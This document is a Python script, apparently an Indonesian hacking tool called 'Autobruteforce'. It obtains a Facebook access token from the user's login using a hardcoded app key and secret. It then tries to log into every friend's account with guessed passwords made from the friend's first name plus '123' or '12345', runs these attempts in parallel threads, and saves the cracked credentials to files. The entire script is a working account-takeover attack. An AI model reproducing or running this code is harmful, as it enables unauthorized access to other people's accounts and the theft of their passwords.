# Coded By Fallyn #
import requests, json, sys, os, hashlib, getpass
from multiprocessing.pool import ThreadPool
os.system("clear")
try:
	os.mkdir("result")
except OSError:
	pass
# Buat ambil token itu punya Osif/Val hehe pinjem:'v
#Apaan ya? :'v
r = "\033[91m"
y = "\033[93m"
g = "\033[92m"
b = "\033[94m"
h = "\033[96m"
pm = "===================================================="
target = []
toke = []
fin = []
live = []
die = []
crsh = []
Banner =(
r+"""       `-.      .-'
          -./\.-
       -.  /__\  .-     [+]  Autobruteforce   [+]
   `-.   `/____\,   .-' [Coded by Naufal Raditya]
       -./.-""-.\.-     [Facebook : Fallyn      ]
        /< (()) >\      [Instagram: @ranxietty  ]
       /__`-..-'__\     
      /___|____|___\ """)
def login():
	try:
		print(y+pm)
		print(Banner)
		print(y+pm)
		id = raw_input(g+"[+] Username : ")
		pwd = getpass.getpass(g+"[+] Password : ")
		N = '\033[0m'
		G = '\033[1;32m'
		API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
		data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
		x = hashlib.new('md5')
		x.update(sig)
		data.update({'sig':x.hexdigest()})
		masuk=requests.get('https://api.facebook.com/restserver.php',params=data).json()
		try:
			token=masuk["access_token"]
		except:
			print(r+"[!] Failed generate access token!")
			exit(y+pm)
		print(g+"[+] Success generate access token!")
		toke.append(token)
		print(y+pm)
		for id in requests.get("https://graph.facebook.com/me/friends?access_token="+token).json()["data"]:
			target.append(id["id"])
	except KeyboardInterrupt:
		print(y+pm)
		sys.exit()
	except (requests.exceptions.ConnectionError ):
		print(y+pm)
		sys.exit()
def brute(tar):
	try:
		fn=requests.get("https://graph.facebook.com/"+tar+"?access_token=%s"%(toke[0])).json()["first_name"]
		fin.append(fn)
		for first in [fn+"123",fn+"12345"]:
			ro=requests.post("https://mbasic.facebook.com/login",data={'email':tar,'pass':first,'login':'submit'}).url
			if "save-device" in ro or "m_sess" in ro:
				live.append(tar)
				open("result/live.txt","a"). write("%s|%s\n"%(tar,first))
				break
			elif "checkpoint" in ro:
				die.append(tar)
				open("result/die.txt","a").write("%s|%s\n"%(tar,first))
				break
			else:
				crsh.append(tar)
				break
		print(r+"\r[+] Failed = %s"%h+str(len(crsh)))+y+" | [+] Checkpoint = %s"%h+str(len(die))+g+" | [+] Live = %s"%h+str(len(live)),;sys.stdout.flush()
	except KeyboardInterrupt:
		print(y+pm)
		if len(live) > 0 or len(die) > 0:
			print(" ")
			print(y+pm)
			print(g+"[+] The results are stored in the result folder!")
			exit(y+pm)
		else:
			print(" ")
			print(y+pm)
			print(r+"[+] No results!!")
			exit(y+pm)
	except (requests.exceptions.ConnectionError ):
		exit(y+pm)
login()
tr=ThreadPool(int(input(g+"[+] Thread   : ")))
print(y+pm)
tr.map(brute,target)
#Lastt
if len(live) > 0 or len(die) > 0:
	print(" ")
	print(y+pm)
	print(g+"[+] The results are stored in the result folder!")
	print(y+pm)
else:
	print(" ")
	print(y+pm)
	print(r+"[+] No results!")
	print(y+pm)
